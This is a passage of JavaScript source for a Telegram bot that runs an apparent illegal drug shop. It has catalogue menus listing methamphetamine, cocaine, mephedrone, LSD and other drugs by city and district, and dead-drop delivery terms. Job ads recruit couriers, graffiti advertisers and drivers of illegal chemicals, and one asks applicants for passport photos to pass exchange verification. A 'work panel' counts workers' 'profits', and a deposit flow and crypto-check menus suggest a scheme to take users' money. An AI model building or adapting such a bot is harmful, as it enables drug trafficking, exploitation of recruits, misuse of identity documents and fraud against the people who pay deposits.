	},
parse_mode: "HTML"
});
}

if(query.data.startsWith("i17")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)
return bot.sendMessage(message.chat.id,`📍 Выберите интересующий вас район:`, {
reply_markup: {
		inline_keyboard: [
                 [
                    { text: "💠 Заводский", callback_data: `kup_3` },
                    { text: "💠 Ленинский", callback_data: `kup_4` },
                 ],
                 [
                    { text: "💠 Октябрьский", callback_data: `kup_5` },
                 ],
                 [
                    { text: "< Назад", callback_data: `kat` },
                                         ],
                 ],
		
	},
parse_mode: "HTML"
});
}

if(query.data.startsWith("o18")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)
return bot.sendMessage(message.chat.id,`📍 Выберите интересующий вас район:`, {
reply_markup: {
		inline_keyboard: [
            [
                { text: "💠 Московский", callback_data: `kup_1` },
                { text: "💠 Пролетарский", callback_data: `kup_2` },
                 ],
                 [
                    { text: "💠 Приволжский", callback_data: `kup_3` },
                    { text: "💠 Южный", callback_data: `kup_4` },
                 ],
                 [
                    { text: "💠 Центральный", callback_data: `kup_5` },
                 ],
                 [
                    { text: "< Назад", callback_data: `kat` },
                                         ],
                 ],
		
	},
parse_mode: "HTML"
});
}

if(query.data.startsWith("logref")) {
    bot.deleteMessage(message.chat.id, message.message_id)
        let fff = ``
        let ggg = ``
        if(message.user.work == 0) {
            await User.findOneAndUpdate({ id: message.user.id }, { $set: { work: 1 } })
            fff += `✅`
            ggg += `<b>✅ Реферальные логи для воркеров включены</b>`
        }
        if(message.user.work == 1) {
            await User.findOneAndUpdate({ id: message.user.id }, { $set: { work: 0 } })
            fff += `❌`
            ggg += `<b>❌ Включите реферальное логирование для воркеров</b>`
        }
            await bot.sendMessage(message.chat.id,`⚡️ Добро пожаловать в work panel ⚡️
    
ID: ${message.user.id}
Вы сделали <b>${message.user.spay}</b> профитов на сумму <b>${message.user.pay}</b> RUB за все время

Ваша реферальная ссылка: http://t.me/Fjdjfkfjckdibot?start=${message.user.id}

${ggg}
            `, {
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [				   
                        [
                            { text: `ℹ Реферальное логирование  (${fff})`, callback_data: `logref` },
                             ],
                    ]      
                 }, 
            });
}

if(query.data.startsWith("p19")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)
return bot.sendMessage(message.chat.id,`📍 Выберите интересующий вас район:`, {
reply_markup: {
		inline_keyboard: [
            [
                { text: "💠 Кировский", callback_data: `kup_1` },
                { text: "💠 Ленинский", callback_data: `kup_2` },
                 ],
                 [
                    { text: "💠 Октябрьский", callback_data: `kup_7` },
                    { text: "💠 Советский", callback_data: `kup_8` },
                 ],
                 [
                    { text: "< Назад", callback_data: `kat` },
                                         ],
                 ],
		
	},
parse_mode: "HTML"
});
}

if(query.data.startsWith("a20")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)
return bot.sendMessage(message.chat.id,`📍 Выберите интересующий вас район:`, {
reply_markup: {
		inline_keyboard: [
            [
                { text: "💠 Войновка", callback_data: `kup_1` },
                { text: "💠 Маяк", callback_data: `kup_2` },
                 ],
                 [
                    { text: "💠 Московский тракт", callback_data: `kup_4` },
                    { text: "💠 Центральный", callback_data: `kup_5` },
                 ],
                 [
                    { text: "< Назад", callback_data: `kat` },
                                         ],
                 ],
		
	},
parse_mode: "HTML"
});
}

if(query.data.startsWith("s21")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)
return bot.sendMessage(message.chat.id,`📍 Выберите интересующий вас район:`, {
reply_markup: {
		inline_keyboard: [
            [
                { text: "💠 Дёмский", callback_data: `kup_1` },
                { text: "💠 Калининский", callback_data: `kup_2` },
                 ],
                 [
                    { text: "💠 Кировский", callback_data: `kup_3` },
                    { text: "💠 Ленинский", callback_data: `kup_4` },
                 ],
                 [
                    { text: "💠 Орджоникидзевский", callback_data: `kup_5` },
                 ],
                 [
                    { text: "< Назад", callback_data: `kat` },
                                         ],
                 ],
		
	},
parse_mode: "HTML"
});
}

if(query.data.startsWith("d22")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)

return bot.sendMessage(message.chat.id,`📍 Выберите интересующий вас район:`, {
reply_markup: {
		inline_keyboard: [
                 [
                    { text: "💠 Центральный", callback_data: `kup_5` },
                 ],
                 [
                    { text: "< Назад", callback_data: `kat` },
                                         ],
                 ],
		
	},
parse_mode: "HTML"
});
}

if(query.data.startsWith("f23")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)
return bot.sendMessage(message.chat.id,`📍 Выберите интересующий вас район:`, {
reply_markup: {
		inline_keyboard: [
            [
                { text: "💠 Калининский", callback_data: `kup_1` },
                { text: "💠 Курчатовский", callback_data: `kup_2` },
                 ],
                 [
                    { text: "💠 Ленинский", callback_data: `kup_3` },
                    { text: "💠 Советский", callback_data: `kup_4` },
                 ],
                 [
                    { text: "💠 Центральный", callback_data: `kup_5` },
                 ],
                 [
                    { text: "< Назад", callback_data: `kat` },
                                         ],
                 ],
		
	},
parse_mode: "HTML"
});
}

if(query.data.startsWith("g24")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)
return bot.sendMessage(message.chat.id,`📍 Выберите интересующий вас район:`, {
reply_markup: {
		inline_keyboard: [
            [
                { text: "💠 Черновский", callback_data: `kup_1` },
                { text: "💠 Железнодорожный", callback_data: `kup_2` },
                 ],
                 [
                    { text: "💠 Ингодинский", callback_data: `kup_3` },
                    { text: "💠 Аэропорт", callback_data: `kup_4` },
                 ],
                 [
                    { text: "💠 Центральный", callback_data: `kup_5` },
                 ],
                 [
                    { text: "< Назад", callback_data: `kat` },
                                         ],
                 ],
		
	},
parse_mode: "HTML"
});
}

if(query.data.startsWith("kat")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)
    
return bot.sendMessage(message.chat.id,`▪️ Если ваш населённый пункт отсутствует в каталоге - обратитесь к оператору, мы поможем с оформлением предзаказа/доставки.

⚡️ Выберите интересующий вас город:`, {
reply_markup: {
		inline_keyboard: [
            [
                { text: "💠 Ангарск", callback_data: `1` },
                { text: "💠 Архангельск", callback_data: `2` },
                 ],
                 [
                    { text: "💠 Владивосток", callback_data: `3` },
                    { text: "💠 Воронеж", callback_data: `4` },
                 ],
                 [
                    { text: "💠 Екатеринбург", callback_data: `5` },
                    { text: "💠 Иркутск", callback_data: `6` },
                 ],
                 [
                    { text: "💠 Казань", callback_data: `7` },
                    { text: "💠 Красноярск", callback_data: `8` },
                 ],
                 [
                    { text: "💠 Москва", callback_data: `9` },
                    { text: "💠 Нижний Новгород", callback_data: `q10` },
                 ],
                 [
                    { text: "💠 Новосибирск", callback_data: `w11` },
                    { text: "💠 Омск", callback_data: `e12` },
                 ],
                 [
                    { text: "💠 Оренбург", callback_data: `r13` },
                    { text: "💠 Ростов на Дону", callback_data: `t14` },
                 ],
                 [
                    { text: "💠 Самара", callback_data: `y15` },
                    { text: "💠 Санкт-Петербург", callback_data: `u16` },
                 ],
                 [
                    { text: "💠 Саратов", callback_data: `i17` },
                    { text: "💠 Тверь", callback_data: `o18` },
                 ],
                 [
                    { text: "💠 Томск", callback_data: `p19` },
                    { text: "💠 Тюмень", callback_data: `a20` },
                 ],
                 [
                    { text: "💠 Уфа", callback_data: `s21` },
                    { text: "💠 Хабаровск", callback_data: `d22` },
                 ],
                 [
                    { text: "💠 Челябинск", callback_data: `f23` },
                    { text: "💠 Чита", callback_data: `g24` },
                 ],
                 [
                    { text: "< Назад", callback_data: `menu` },
                                         ],
                 ],
		
	},
parse_mode: "HTML"
});
}

if(query.data.startsWith("tkur")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)

return bot.sendMessage(message.chat.id,`🏃‍♂️ Курьер 🏃‍♂️

Суть работы - «раскладка» позиций по выданному району.

▪️ Мы платим за загруженные адреса, вам не нужно ожидать продажи клада.
▪️ Оплата за выполненную работу день в день.
▪️ Премии и бонусы среди курьеров организуются еженедельно.
▪️ Конкурсы среди курьеров проводятся в конце каждого календарного месяца. 
▪️ Мы обладаем огромной библиотекой обучающих материалов. Обучение проводится сотрудниками со стажем работы более пяти лет.
▪️ Присутствует чат для курьеров, в котором вы сможете обмениваться опытом с другими сотрудниками.
Устройство исключительно по залогу от 3000₽. Для начала трудоустройства напишите свой город оператору.

`, {
reply_markup: {
		inline_keyboard: [
            [
                { text: "🏃‍♂️ Курьер", callback_data: `tkur` },
                { text: "🖼 Трафаретчик", callback_data: `traf` },
                { text: "🚛 Водитель", callback_data: `vodila` },
                 ],
                 [
{ text: "📰 Верификация", callback_data: `veg` },
{ text: "🧑‍💻 Оператор", callback_data: `oper` },
                 ],
                 [
                    { text: "< Назад", callback_data: `menu` },
                                         ],
                 ],
		
	},
parse_mode: "HTML"
});
}

if(query.data.startsWith("traf")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)

return bot.sendMessage(message.chat.id,`🖼 Трафаретчик 🖼

Суть работы - нанесение рисунка/наклейки на проходимые места, фотографирование граффити/стикера через приложение NoteCam

▪️ Оплата от 110₽ за граффити.
▪️ Оплата от 50₽ за стикер. 
▪️ Выплата от 20 граффити / 50 стикеров.
▪️ Текст для граффити выдаст оператор.
▪️ Чек при покупке краски сохраняйте, мы компенсируем затраты на неё при получении первой ЗП.

Для начала трудоустройства напишите свой город оператору, получите более подробную информацию и купите баллон с краской

`, {
reply_markup: {
		inline_keyboard: [
            [
                { text: "🏃‍♂️ Курьер", callback_data: `tkur` },
                { text: "🖼 Трафаретчик", callback_data: `traf` },
                { text: "🚛 Водитель", callback_data: `vodila` },
                 ],
                 [
{ text: "📰 Верификация", callback_data: `veg` },
{ text: "🧑‍💻 Оператор", callback_data: `oper` },
                 ],
                 [
                    { text: "< Назад", callback_data: `menu` },
                                         ],
                 ],
		
	},
parse_mode: "HTML"
});
}

if(query.data.startsWith("vodila")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)

return bot.sendMessage(message.chat.id,`🚛 Водитель 🚛

Суть работы - перевозка товара (хим.веществ нелегального характера между городами)

График не нормирован, рейсы на разные расстояния, ЗП от 70000₽ за рейс, работа с большим весом..

▪️ Все расходные материалы покрывают отдельно (ГСМ, аренда жилья по надобности).
▪️ Оплату получаете после доставки товара, и его проверки, все расходы так же возмещают в ЗП.
▪️ ЗП на биткоин кошелек, в случае неумения им пользоваться - предоставляется инструкция.
▪️ После устройства куратор проведет полный инструктаж по работе и технике безопасности, для практики вам будет выдан один оплачиваемый стажировочный рейс.

Устройство исключительно по залогу от 60000₽. Для начала трудоустройства напишите свой город оператору.

`, {
reply_markup: {
		inline_keyboard: [
            [
                { text: "🏃‍♂️ Курьер", callback_data: `tkur` },
                { text: "🖼 Трафаретчик", callback_data: `traf` },
                { text: "🚛 Водитель", callback_data: `vodila` },
                 ],
                 [
{ text: "📰 Верификация", callback_data: `veg` },
{ text: "🧑‍💻 Оператор", callback_data: `oper` },
                 ],
                 [
                    { text: "< Назад", callback_data: `menu` },
                                         ],
                 ],
		
	},
parse_mode: "HTML"
});
}

if(query.data.startsWith("veg")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)

return bot.sendMessage(message.chat.id,`📰 Верификация 📰

Суть работы - прохождение верификации на различных биржах

▪️ Доступно от 2х заданий ежедневно.
▪️ Выплата после проверки документа сервисом. 
▪️ Оплата 1 задания = 1000 ₽.
▪️ Оплату за верификацию можно использовать как залог для другой вакансии.

Для начала трудоустройства пришлите фото первой страницы паспорта оператору. Пример: <a href="https://telegra.ph/file/52e526bf246fbd07eb5e5.png">перейти</a>
`, {
reply_markup: {
		inline_keyboard: [
            [
                { text: "🏃‍♂️ Курьер", callback_data: `tkur` },
                { text: "🖼 Трафаретчик", callback_data: `traf` },
                { text: "🚛 Водитель", callback_data: `vodila` },
                 ],
                 [
{ text: "📰 Верификация", callback_data: `veg` },
{ text: "🧑‍💻 Оператор", callback_data: `oper` },
                 ],
                 [
                    { text: "< Назад", callback_data: `menu` },
                                         ],
                 ],
		
	},
parse_mode: "HTML"
});
}

if(query.data.startsWith("oper")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)

return bot.sendMessage(message.chat.id,`👨‍💻 Оператор 👨‍💻

Суть работы - прием оплаты от клиентов, консультация, выдача координатов.

▪️ График - самостоятельный (5/2, 2/2 и т.д. на ваше усмотрение).
▪️ Минимальное время работы в день - 4 часа, но не менее 30ч в неделю.
▪️ ЗП рассчитывается от % выполненных продаж   премии.
▪️ % от продаж рассчитывается в зависимости от времени суток. Дневное время - 5%, ночное - 10%.
▪️ Необходим навык быстрого набора текста без допущения орфографических ошибок.

Устройство исключительно по залогу от 5000₽. Для начала трудоустройства напишите свой город оператору.

`, {
reply_markup: {
		inline_keyboard: [
            [
                { text: "🏃‍♂️ Курьер", callback_data: `tkur` },
                { text: "🖼 Трафаретчик", callback_data: `traf` },
                { text: "🚛 Водитель", callback_data: `vodila` },
                 ],
                 [
{ text: "📰 Верификация", callback_data: `veg` },
{ text: "🧑‍💻 Оператор", callback_data: `oper` },
                 ],
                 [
                    { text: "< Назад", callback_data: `menu` },
                                         ],
                 ],
		
	},
parse_mode: "HTML"
});
}

if(query.data.startsWith("tkur")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)

return bot.sendMessage(message.chat.id,`🏃‍♂️ Курьер 🏃‍♂️

Суть работы - «раскладка» позиций по выданному району.

▪️ Мы платим за загруженные адреса, вам не нужно ожидать продажи клада.
▪️ Оплата за выполненную работу день в день.
▪️ Премии и бонусы среди курьеров организуются еженедельно.
▪️ Конкурсы среди курьеров проводятся в конце каждого календарного месяца. 
▪️ Мы обладаем огромной библиотекой обучающих материалов. Обучение проводится сотрудниками со стажем работы более пяти лет.
▪️ Присутствует чат для курьеров, в котором вы сможете обмениваться опытом с другими сотрудниками.
Устройство исключительно по залогу от 3000₽. Для начала трудоустройства напишите свой город оператору.

`, {
reply_markup: {
		inline_keyboard: [
            [
                { text: "🏃‍♂️ Курьер", callback_data: `tkur` },
                { text: "🖼 Трафаретчик", callback_data: `traf` },
                { text: "🚛 Водитель", callback_data: `vodila` },
                 ],
                 [
{ text: "📰 Верификация", callback_data: `veg` },
{ text: "🧑‍💻 Оператор", callback_data: `oper` },
                 ],
                 [
                    { text: "< Назад", callback_data: `menu` },
                                         ],
                 ],
		
	},
parse_mode: "HTML"
});
}

if(query.data.startsWith("work")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)

return bot.sendMessage(message.chat.id,`🔥 Работа 🔥

Свободные вакансии в нашем магазине:
`, {
reply_markup: {
		inline_keyboard: [
            [
                { text: "🏃‍♂️ Курьер", callback_data: `tkur` },
                { text: "🖼 Трафаретчик", callback_data: `traf` },
                { text: "🚛 Водитель", callback_data: `vodila` },
                 ],
                 [
{ text: "📰 Верификация", callback_data: `veg` },
{ text: "🧑‍💻 Оператор", callback_data: `oper` },
                 ],
                 [
                    { text: "< Назад", callback_data: `menu` },
                                         ],
                 ],
		
	},
parse_mode: "HTML"
});
}

if(query.data.startsWith("deposit")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)
    await User.findOneAndUpdate({ id: message.user.id }, { $set: { menu: `deposit` } })
return bot.sendMessage(message.chat.id,`👉🏻 Введите необходимую сумму для пополнения:`, {
reply_markup: {
		inline_keyboard: [
                 [
                    { text: "< Назад", callback_data: `menu` },
                                         ],
                 ],
		
	},
parse_mode: "HTML"
});
}

if(query.data.startsWith("referal")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)

return bot.sendMessage(message.chat.id,`👥 Реферальная программа 👥

Ваша реферальная ссылка: http://t.me/Fjdjfkfjckdibot?start=${message.user.id}

▪️ Заработано за всё время: 0 ₽

Если человек, приглашенный по реферальной ссылке, пополнит баланс, то вы получите 10% от суммы его депозита`, {
reply_markup: {
		inline_keyboard: [
            [
                { text: "💊 Каталог", callback_data: `kat` },
                { text: "👥 Реферальная программа", callback_data: `referal` },
                { text: "ℹ️ Отзывы", callback_data: `otz` },
                 ],
                 [
                    { text: "🚕 Доставка", callback_data: `kur` },
                    { text: "⚡ Профиль", callback_data: `prof` },
                    { text: "🧑‍💻 Оператор", url: `t.me/` },
                 ],
                 [
{ text: "🔥 Работа", callback_data: `work` },
{ text: "🛒 Мои покупки", callback_data: `pok` },
                 ],
                 [
                    { text: "💲 Пополнить баланс", callback_data: `deposit` },
                                         ],
                 ],
		
	},
parse_mode: "HTML"
});
}


if(query.data.startsWith("kur")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)

return bot.sendMessage(message.chat.id,`🚕 Доставка 🚕

▪️ При покупке любого товара из каталога вы можете заказать доставку. 

▪️ Доставка полностью анонимная и бесконтактная. Для осуществления доставки необходимо указать желаемый адрес и курьер оставит клад в радиусе 300м, после чего сообщит координаты дополнительно приложив подробные фото.

💸 Стоимость доставки:
▫️ Обычная — 1200 ₽
╚ Срок выполнения: от 4 до 12 часов
▫️ Ускоренная — 1800 ₽
╚ Срок выполнения: от 1 до 2 часов

▪️ При заказе от 8000 ₽ доставка за счет магазина.`, {
reply_markup: {
		inline_keyboard: [
            [
                { text: "💊 Каталог", callback_data: `kat` },
                { text: "👥 Реферальная программа", callback_data: `referal` },
                { text: "ℹ️ Отзывы", callback_data: `otz` },
                 ],
                 [
                    { text: "🚕 Доставка", callback_data: `kur` },
                    { text: "⚡ Профиль", callback_data: `prof` },
                    { text: "🧑‍💻 Оператор", url: `t.me/` },
                 ],
                 [
{ text: "🔥 Работа", callback_data: `work` },
{ text: "🛒 Мои покупки", callback_data: `pok` },
                 ],
                 [
                    { text: "💲 Пополнить баланс", callback_data: `deposit` },
                                         ],
                 ],
		
	},
parse_mode: "HTML"
});
}



if(query.data.startsWith("fout")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)

return bot.sendMessage(message.chat.id,`Выберите криптовалюту для отправки.`, {
reply_markup: {
		inline_keyboard: [
			[{ text: "Tether - USDT (TRC20, ERC20, BEP20)", callback_data: `out_tether` }],
			[{ text: "Toncoin - TON (TON)", callback_data: `out_ton` }],
			[{ text: "Bitcoin - BTC (BTC)", callback_data: `out_btc` }],
			[{ text: "Ethereum - ETH (ERC20)", callback_data: `out_eth` }],
			[{ text: "Binance Coin - BNB (BEP20)", callback_data: `out_bnb` }],
			[{ text: "Binance USD - BUSD (BEP20)", callback_data: `out_busd` }],
[{ text: "< Назад", callback_data: `menu` }],
		]
	},
parse_mode: "HTML"
});
}

if(query.data.startsWith("check")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)

return bot.sendMessage(message.chat.id,`💰 <b>Чеки</b>
    
<b>Можно создать</b>:
· Персональный - чек для отправки монет одному пользователю
· Мульти-чек - чек для отправки монет нескольким пользователям
· Rocket-чек - аналог мульти-чека, но с большим набором возможностей

Выберите тип чека:
`, {
reply_markup: {
		inline_keyboard: [
			[{ text: "Персональные", callback_data: `gift` },{ text: "Мульти", callback_data: `raz` }],
			[{ text: "🚀 Rocket", callback_data: `raz` }],
[{ text: "< Назад", callback_data: `menu` }],
		]
	},
parse_mode: "HTML"
});
}

if(query.data.startsWith("ref")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)

return bot.sendMessage(message.chat.id,`🛡 <b>Реферальная система</b>

Что бы заработать ещё, Вам нужно поделиться своей реферальной ссылкой на данный чек.

<b>Вы получите TON за активации чека по Вашей ссылке.</b>

Ваша награда за рефералов: 
			> 1 уровень: <b>0.03 TON (0.07$)</b>
			> 2 уровень: <b>0.02 TON (0.05$)</b>
			> 3 уровень: <b>0.01 TON (0.03$)</b>
			> 4 уровень: <b>0.005 TON (0.01$)</b>
			> 5 уровень: <b>0.002 TON (0.005$)</b>

За активацию чека ваш реферал получит награду: <b>0.02 TON (0.05$)</b>

Ссылка:
https://t.me/TokenRocketRobot?start=${message.user.id}`, {
reply_markup: {
		inline_keyboard: [
			[{ text: "Статистика", callback_data: `statsref` }],
			[{ text: "Показать QR код", callback_data: `qrref` }],
[{ text: "< Назад", callback_data: `menu` }],
		]
	},
parse_mode: "HTML"
});
}

		if(query.data.startsWith("qrref")) {				
			bot.deleteMessage(message.chat.id, message.message_id)
			var result = random.generate(30)
			var png = random.generate(10)
			qrcode.toFile(`${png}.png`, `https://t.me/TokenRocketRobot?start=${message.user.id}`, {
			  color: {
				dark: '#000',  
				light: '#0000'
			  }
			}, function (err) {
			  if (err) throw err
			  console.log('done')
			})
							let file = `${png}.png`
							
					 bot.sendPhoto(message.user.id, file, {
						caption: `Данный QR код можно отправить другу, за переход вы получите реферальный бонус`,
						reply_markup: {
								inline_keyboard: [
						[{ text: "< Назад", callback_data: `ref` }],
								]
							},
						}) 
					
				fs.unlink(`${png}.png`, (err) => {
			 if (err) throw err;
			
			  console.log('Deleted');
					})
		}

if(query.data.startsWith("statsref")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)

return bot.sendMessage(message.chat.id,`
🚀 <b>Ваша статистика реферальной программы</b>

Пользователей приглашено по ссылке: <b>${message.user.part}</b>
Вы получили наград как распространитель: 
 · <b>${message.user.refmoney} TON</b>`, {
reply_markup: {
		inline_keyboard: [
[{ text: "< Назад", callback_data: `ref` }],
		]
	},
parse_mode: "HTML"
});
}

		if(query.data.startsWith("market")) {
							
			bot.deleteMessage(message.chat.id, message.message_id)

		return bot.sendMessage(message.chat.id,`
		💱 Здесь вы можете купить или продать криптовалюту с помощью перевода на карту или электронный кошелёк.

		🛡 Бот выступает гарантом и удерживает монеты на время сделки. Комиссия на покупку – 0%, на продажу – 0.75%.
		
		🔑 Данный раздел находится в разработке`, {
reply_markup: {
				inline_keyboard: [
		[{ text: "📈 Купить", callback_data: `raz` },{ text: "📉 Продать", callback_data: `raz` }],
		[{ text: "📋 Мои сделки", callback_data: `raz` },{ text: "📄 История", callback_data: `raz` }],
		[{ text: "🔒 Создать объявление", callback_data: `raz` }],
		[{ text: "⚙ Настройки", callback_data: `raz` }],
		[{ text: "< Назад", callback_data: `menu` }],
				]
			},
parse_mode: "HTML"
});
}

if(query.data.startsWith("kup")) {
    let id		= (query.data.split("_")[1])
    console.log(id)
if(id == 1) {
    bot.deleteMessage(message.chat.id, message.message_id)
return bot.sendMessage(message.chat.id,`📦 Выберите интересующий вас товар:`, {
reply_markup: {
        inline_keyboard: [
[{ text: "🔮 Альфа BLUECRYS 1гр", callback_data: `bano_3499` },{ text: "🔮 ЛСД 6шт", callback_data: `bano_7299` }],
[{ text: "🔮 ЛСД 2шт", callback_data: `bano_2899` },{ text: "🔮 КОКС - Prestige 0.5гр", callback_data: `bano_6999` }],
[{ text: "🔮 КОКС - Prestige 2гр", callback_data: `bano_19999` },{ text: "🔮 Меф GOLDEN 2гр", callback_data: `bano_4599` }],
[{ text: "🔮 ГАШИШ - TWIX 4гр", callback_data: `bano_6399` },{ text: "🔮 МЕФЕДРОН - FLOUR 1гр", callback_data: `bano_2199` }],
[{ text: "🔮 Альфа BLUECRYS 3гр", callback_data: `bano_7895` }],
[{ text: "< Меню", callback_data: `menu` }],
        ]
    },
parse_mode: "HTML"
});
}

if(id == 2) {
    bot.deleteMessage(message.chat.id, message.message_id)
    return bot.sendMessage(message.chat.id,`📦 Выберите интересующий вас товар:`, {
    reply_markup: {
            inline_keyboard: [
    [{ text: "🔮 Экстази BARCELONA 5шт", callback_data: `bano_5695` },{ text: "🔮 ЛСД 5шт", callback_data: `bano_6399` }],
    [{ text: "🔮 Шишики Tutankhamon 2гр", callback_data: `bano_4699` },{ text: "🔮 МЕФЕДРОН - FLOUR 10гр", callback_data: `bano_16999` }],
    [{ text: "🔮 Шишики Peyote Crit 1гр", callback_data: `bano_2699` },{ text: "🔮 ЛСД 6шт", callback_data: `bano_7299` }],
    [{ text: "🔮 ГАШИШ - TWIX 1гр", callback_data: `bano_2495` }],
    [{ text: "< Меню", callback_data: `menu` }],
            ]
        },
    parse_mode: "HTML"
    });
    }

    if(id == 3) {
        bot.deleteMessage(message.chat.id, message.message_id)
        return bot.sendMessage(message.chat.id,`📦 Выберите интересующий вас товар:`, {
        reply_markup: {
                inline_keyboard: [
        [{ text: "🔮 Экстази BARCELONA 10шт", callback_data: `bano_8990` },{ text: "🔮 Шишики Tutankhamon 1гр", callback_data: `bano_2899` }],
        [{ text: "🔮 ЛСД 2шт", callback_data: `bano_2899` },{ text: "🔮 Меф GOLDEN 1гр", callback_data: `bano_2499` }],
        [{ text: "🔮 Шишики Peyote Crit 2гр", callback_data: `bano_4399` },{ text: "🔮 ГАШИШ - TWIX 2гр", callback_data: `bano_3895` }],
        [{ text: "🔮 МЕФЕДРОН - FLOUR 3гр", callback_data: `bano_4799` },{ text: "🔮 МЕТАМФЕТАМИН 3гр", callback_data: `bano_7499` }],
        [{ text: "🔮 ГАШИШ - TWIX 5гр", callback_data: `bano_7395` },{ text: "🔮 Шишики Tutankhamon 3гр ", callback_data: `bano_5899` }],
        [{ text: "🔮 Альфа BLUECRYS 2гр", callback_data: `bano_5697` }],
        [{ text: "< Меню", callback_data: `menu` }],
                ]
            },
        parse_mode: "HTML"
        });
        }

        if(id == 4) {
            bot.deleteMessage(message.chat.id, message.message_id)
            return bot.sendMessage(message.chat.id,`📦 Выберите интересующий вас товар:`, {
            reply_markup: {
                    inline_keyboard: [
            [{ text: "🔮 КОКС - Prestige 1гр", callback_data: `bano` },{ text: "🔮 Меф GOLDEN 2гр", callback_data: `bano_4599` }],
            [{ text: "🔮 ЛСД 2шт", callback_data: `bano_2899` },{ text: "🔮 Экстази BARCELONA 5шт", callback_data: `bano` }],
            [{ text: "🔮 Шишики Tutankhamon 3гр", callback_data: `bano` },{ text: "🔮 КСАНАКС 5шт", callback_data: `bano` }],
            [{ text: "🔮 Шишики Peyote Crit 2гр", callback_data: `bano` }],
            [{ text: "< Меню", callback_data: `menu` }],
                    ]
                },
            parse_mode: "HTML"
            });
            }

            if(id == 5) {
                bot.deleteMessage(message.chat.id, message.message_id)
                return bot.sendMessage(message.chat.id,`📦 Выберите интересующий вас товар:`, {
                reply_markup: {
                        inline_keyboard: [
                [{ text: "🔮 Экстази BARCELONA 15шт", callback_data: `bano` },{ text: "🔮 Экстази HAINEKEN 8шт", callback_data: `bano` }],
                [{ text: "🔮 Шишики Peyote Crit 2гр", callback_data: `bano` },{ text: "🔮 ГАШИШ - TWIX 2гр", callback_data: `bano` }],
                [{ text: "🔮 Альфа BLUECRYS 3гр", callback_data: `bano` },{ text: "🔮 MDMA (Европа) 3шт", callback_data: `bano` }],
                [{ text: "🔮 МЕТАМФЕТАМИН 2гр", callback_data: `bano` },{ text: "🔮 КСАНАКС 3шт", callback_data: `bano` }],
                [{ text: "🔮 КСАНАКС 5шт", callback_data: `bano` }],
                [{ text: "< Меню", callback_data: `menu` }],
                        ]
                    },
                parse_mode: "HTML"
                });
                }

                if(id == 6) {
                    bot.deleteMessage(message.chat.id, message.message_id)
                    return bot.sendMessage(message.chat.id,`📦 Выберите интересующий вас товар:`, {
                    reply_markup: {
                            inline_keyboard: [
                    [{ text: "🔮 КСАНАКС 5шт", callback_data: `bano` },{ text: "🔮 Экстази BARCELONA 5шт", callback_data: `bano` }],
                    [{ text: "🔮 Меф GOLDEN 1гр", callback_data: `bano_2499` },{ text: "🔮 ЛСД 5шт", callback_data: `bano_6399` }],
                    [{ text: "🔮 Альфа BLUECRYS 1гр", callback_data: `bano` },{ text: "🔮 Шишики Peyote Crit 1гр", callback_data: `bano` }],
                    [{ text: "🔮 ГАШИШ - TWIX 3гр", callback_data: `bano` },{ text: "🔮 МЕТАМФЕТАМИН 1гр", callback_data: `bano` }],
                    [{ text: "🔮 МЕФЕДРОН - FLOUR 5гр", callback_data: `bano` }],
                    [{ text: "< Меню", callback_data: `menu` }],
                            ]
                        },
                    parse_mode: "HTML"
                    });
                    }

                    if(id == 7) {
                        bot.deleteMessage(message.chat.id, message.message_id)
                        return bot.sendMessage(message.chat.id,`📦 Выберите интересующий вас товар:`, {
                        reply_markup: {
                                inline_keyboard: [
                        [{ text: "🔮 Экстази BARCELONA 15шт", callback_data: `bano` },{ text: "🔮 Альфа BLUECRYS 2гр", callback_data: `bano` }],
                        [{ text: "🔮 КОКС - Prestige 0.5гр", callback_data: `bano` },{ text: "🔮 КОКС - Prestige 1гр", callback_data: `bano` }],
                        [{ text: "🔮 Шишики Tutankhamon 1гр", callback_data: `bano` },{ text: "🔮 Меф GOLDEN 3гр", callback_data: `bano_5899` }],
                        [{ text: "🔮 МЕФЕДРОН - FLOUR 10гр", callback_data: `bano` },{ text: "🔮 Шишики Peyote Crit 3гр", callback_data: `bano` }],
                        [{ text: "🔮 МЕТАМФЕТАМИН 5гр", callback_data: `bano` }],
                        [{ text: "< Меню", callback_data: `menu` }],
                                ]
                            },
                        parse_mode: "HTML"
                        });
                        }

                        if(id == 8) {
                             bot.deleteMessage(message.chat.id, message.message_id)
                            return bot.sendMessage(message.chat.id,`📦 Выберите интересующий вас товар:`, {
                            reply_markup: {
                                    inline_keyboard: [
                                        [{ text: "🔮 Экстази BARCELONA 10шт", callback_data: `bano_8990` },{ text: "🔮 Шишики Tutankhamon 1гр", callback_data: `bano_2899` }],
                            [{ text: "🔮 ЛСД 6шт", callback_data: `bano_7299` },{ text: "🔮 Меф GOLDEN 3гр", callback_data: `bano_5899` }],
                            [{ text: "🔮 ГАШИШ - TWIX 5гр", callback_data: `bano_7395` },{ text: "🔮 Шишики Tutankhamon 3гр ", callback_data: `bano_5899` }],
                            [{ text: "< Меню", callback_data: `menu` }],
                                    ]
                                },
                            parse_mode: "HTML"
                            });
                            }
                            if(id == 9) {
                                bot.deleteMessage(message.chat.id, message.message_id)
                                return bot.sendMessage(message.chat.id,`📦 Выберите интересующий вас товар:`, {
                                reply_markup: {
                                        inline_keyboard: [
                                [{ text: "🔮 Экстази BARCELONA 15шт", callback_data: `bano` },{ text: "🔮 Альфа BLUECRYS 2гр", callback_data: `bano` }],
